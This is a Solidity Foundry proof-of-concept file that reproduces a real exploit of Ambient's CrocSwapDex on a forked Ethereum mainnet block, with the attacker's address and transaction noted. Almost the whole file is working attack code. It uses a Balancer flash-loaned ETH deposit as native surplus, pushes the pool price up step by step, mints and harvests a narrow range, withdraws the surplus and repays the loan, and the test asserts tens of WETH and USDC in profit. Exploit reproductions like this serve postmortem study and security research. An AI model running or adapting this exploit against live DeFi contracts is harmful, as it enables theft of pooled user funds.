// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~67.85 ETH after final USDC->WETH conversion and ETH forwarding
// Attacker : 0x0000000000037e625b2502c26029aea237f102af
// Attack Contract : 0xaac14d196a9e27923a92d8e87e3b6a5dcd4fec1b
// Vulnerable Contract : 0xAaAaAAAaA24eEeb8d57D431224f73832bC34f688
// Attack Tx : https://etherscan.io/tx/0xb2fc668c42623261074de6fc30d583efede2b0e20d7aded42b7b634f9322ff52

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xAaAaAAAaA24eEeb8d57D431224f73832bC34f688#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2063816231023427861
//
// The helper deposited flash-loaned WETH as Ambient native surplus, walked the ETH/USDC
// pool up one grid at a time, minted and harvested a narrow range, then disbursed the
// extracted native surplus and repaid Balancer.

address constant ATTACKER = 0x0000000000037E625B2502C26029Aea237f102aF;
address constant ATTACK_CONTRACT = 0xAAC14D196A9E27923A92D8e87E3b6A5DCD4fEc1B;
address constant CROC_SWAP_DEX = 0xAaAaAAAaA24eEeb8d57D431224f73832bC34f688;
address constant CROC_QUERY = 0xCA00926b6190c2C59336E73F02569c356d7B6b56;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

interface ICrocSwapDex {
    function userCmd(
        uint16 callpath,
        bytes calldata cmd
    ) external payable returns (bytes memory);
}

interface ICrocQuery {
    function queryCurveTick(
        address base,
        address quote,
        uint256 poolIdx
    ) external view returns (int24);
}

library AmbientTickMath {
    int24 internal constant MIN_TICK = -665_454;
    int24 internal constant MAX_TICK = 831_818;

    function getSqrtRatioAtTick(
        int24 tick
    ) internal pure returns (uint128 sqrtPriceX64) {
        unchecked {
            require(tick >= MIN_TICK && tick <= MAX_TICK, "tick");
            uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));

            uint256 ratio =
                absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
            if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
            if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
            if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
            if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
            if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
            if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
            if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
            if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
            if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
            if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
            if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
            if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
            if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
            if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
            if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
            if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
            if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
            if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
            if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;

            if (tick > 0) ratio = type(uint256).max / ratio;
            sqrtPriceX64 = uint128((ratio >> 64) + (ratio % (1 << 64) == 0 ? 0 : 1));
        }
    }
}

contract ContractTest is BaseTestWithBalanceLog {
    AmbientCrocSwapDexAttacker private exploit;
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork("mainnet", 25_266_404);
        profitReceiver = makeAddr("profitReceiver");

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "Original Attack Contract");
        vm.label(profitReceiver, "PoC Profit Receiver");
        vm.label(CROC_SWAP_DEX, "Ambient CrocSwapDex");
        vm.label(CROC_QUERY, "Ambient CrocQuery");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public {
        logTokenBalance(WETH_TOKEN, profitReceiver, "Profit receiver before exploit");
        logTokenBalance(USDC_TOKEN, profitReceiver, "Profit receiver before exploit");

        uint256 wethBefore = IERC20(WETH_TOKEN).balanceOf(profitReceiver);
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(profitReceiver);

        exploit = new AmbientCrocSwapDexAttacker(profitReceiver);
        exploit.attack();

        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(profitReceiver) - wethBefore;
        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(profitReceiver) - usdcBefore;

        emit log_named_decimal_uint("WETH profit after Balancer repayment", wethProfit, 18);
        emit log_named_decimal_uint("USDC profit before final router conversion", usdcProfit, 6);
        logTokenBalance(WETH_TOKEN, profitReceiver, "Profit receiver after exploit");
        logTokenBalance(USDC_TOKEN, profitReceiver, "Profit receiver after exploit");

        assertGt(wethProfit, 30 ether, "missing WETH profit");
        assertGt(usdcProfit, 50_000e6, "missing USDC profit");
    }
}

contract AmbientCrocSwapDexAttacker is IFlashLoanRecipient {
    using AmbientTickMath for int24;

    address private immutable owner;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    receive() external payable {}

    function attack() external {
        address[] memory tokens = new address[](2);
        tokens[0] = USDC_TOKEN;
        tokens[1] = WETH_TOKEN;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1;
        amounts[1] = 50 ether;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "vault");

        IERC20(USDC_TOKEN).approve(CROC_SWAP_DEX, 0);
        IERC20(USDC_TOKEN).approve(CROC_SWAP_DEX, type(uint256).max);

        IWETH(payable(WETH_TOKEN)).withdraw(amounts[1]);

        // step 1: create native ETH surplus in Ambient. ColdPath command 73 deposits native surplus.
        ICrocSwapDex(CROC_SWAP_DEX).userCmd{value: amounts[1]}(
            3, abi.encode(uint8(73), address(this), uint128(amounts[1]), address(0))
        );

        // step 2: walk the native/USDC pool up thirteen grid steps, deriving each limit from live pool tick state.
        uint256 poolIdx = 420;
        int24 tickGridStep = 800;
        int24 startTick = currentTick(poolIdx);
        int24 stopTick = startTick + (13 * tickGridStep);
        while (currentTick(poolIdx) < stopTick) {
            int24 nextTick = currentTick(poolIdx) + tickGridStep;
            hotSwap(poolIdx, true, true, 1e30, nextTick.getSqrtRatioAtTick(), 1);
        }

        // step 3: mint the same narrow range position used by the attack helper.
        int24 rangeBidTick = currentTick(poolIdx) + 3;
        int24 rangeAskTick = rangeBidTick + 32;
        warmRange(poolIdx, 1, 19_111_745_536, rangeBidTick, rangeAskTick);

        // step 4: nudge the range and harvest it. The +19 tick limit matches the in-range trace swap.
        hotSwap(poolIdx, true, true, 1e30, (currentTick(poolIdx) + 19).getSqrtRatioAtTick(), 1);
        warmRange(poolIdx, 5, 0, rangeBidTick, rangeAskTick);

        // step 5: swap back toward the starting tick, disburse native surplus, and repay Balancer.
        hotSwap(poolIdx, false, false, 1e30, startTick.getSqrtRatioAtTick(), 1);
        // ColdPath command 74 disburses all native surplus.
        ICrocSwapDex(CROC_SWAP_DEX).userCmd(3, abi.encode(uint8(74), address(this), int128(0), address(0)));

        IWETH(payable(WETH_TOKEN)).deposit{value: address(this).balance}();

        tokens[0].transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        tokens[1].transfer(BALANCER_VAULT, amounts[1] + feeAmounts[1]);

        IERC20(WETH_TOKEN).transfer(owner, IERC20(WETH_TOKEN).balanceOf(address(this)));
        IERC20(USDC_TOKEN).transfer(owner, IERC20(USDC_TOKEN).balanceOf(address(this)));
    }

    function hotSwap(
        uint256 poolIdx,
        bool isBuy,
        bool inBaseQty,
        uint128 qty,
        uint128 limitPrice,
        uint8 reserveFlags
    ) private returns (int128 baseFlow, int128 quoteFlow) {
        bytes memory output = ICrocSwapDex(CROC_SWAP_DEX)
            .userCmd(
                1,
                abi.encode(
                    address(0),
                    USDC_TOKEN,
                    poolIdx,
                    isBuy,
                    inBaseQty,
                    qty,
                    uint16(0),
                    limitPrice,
                    uint128(0),
                    reserveFlags
                )
            );
        (baseFlow, quoteFlow) = abi.decode(output, (int128, int128));
    }

    function warmRange(
        uint256 poolIdx,
        uint8 code,
        uint128 liq,
        int24 bidTick,
        int24 askTick
    ) private returns (int128 baseFlow, int128 quoteFlow) {
        bytes memory output = ICrocSwapDex(CROC_SWAP_DEX)
            .userCmd(
                2,
                abi.encode(
                    code,
                    address(0),
                    USDC_TOKEN,
                    poolIdx,
                    bidTick,
                    askTick,
                    liq,
                    AmbientTickMath.getSqrtRatioAtTick(AmbientTickMath.MIN_TICK),
                    AmbientTickMath.getSqrtRatioAtTick(AmbientTickMath.MAX_TICK) - 1,
                    uint8(1),
                    address(0)
                )
            );
        (baseFlow, quoteFlow) = abi.decode(output, (int128, int128));
    }

    function currentTick(
        uint256 poolIdx
    ) private view returns (int24) {
        return ICrocQuery(CROC_QUERY).queryCurveTick(address(0), USDC_TOKEN, poolIdx);
    }
}
